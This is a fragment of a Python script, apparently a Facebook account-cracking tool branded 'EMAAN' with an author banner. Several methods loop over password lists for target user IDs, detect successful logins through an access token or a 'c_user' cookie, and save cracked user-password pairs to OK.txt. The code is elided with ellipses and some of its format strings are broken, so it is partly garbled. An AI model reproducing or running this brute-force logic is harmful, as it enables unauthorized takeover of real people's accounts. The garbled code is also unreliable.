...
class __crack__:
    ...
    def __api__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\033[1;97m[EMAAN] %s/%s  \033[1;90mOK-:%s | \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            ...
            if "access_token" in p:
                print('\r\033[1;90m[EMAAN-OK] %s | %s%s      '%(user,pw,))
                wrt = '%s - %s %s'%(user,pw,)
                ok.append(wrt)
                ...
                try:
                    ...
                    print('\r\033[1;91m[EMAAN-CP] %s | %s | %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
                    ...
                    pass
                print('\r\033[1;91m[EMAAN-CP] %s | %s%s      '%(user,pw,tahun(user)))
    ...
    def __mbasic__(self, user, _sempak_):
        ...
        for pw in _sempak_:
            ...
            if 'c_user' in ses.cookies.get_dict():
                print('\r\033[1;90m[EMAAN-OK] %s | %s      ' % (user,pw))
                wrt = '%s - %s' % (user,pw)
                ok.append(wrt)
                open('OK.txt','a').write('%s\n' % wrt)
                break
    ...
    def __mfb__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\033[1;96m[EMAAN] %s/%s  \033[1;92m0K-:%s | \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
...
\033[0;91m║\033[1;92m➤\033[1;91m Author \033[1;97m：\033[1;93mEMAAN\033[1;97m\x1b[1;32m\x1b[1;37m   \033[1;91m                  ║
\033[0;91m║\033[1;92m➤\033[1;91m Github \033[1;97m：\033[1;93mTHE-DEMON-EMAAN             \033[1;91m      ║
\033[0;91m║\033[1;92m➤\033[1;91m Fb ID \033[1;97m ：\033[1;93mEMAAN007              \033[1;91m          ║
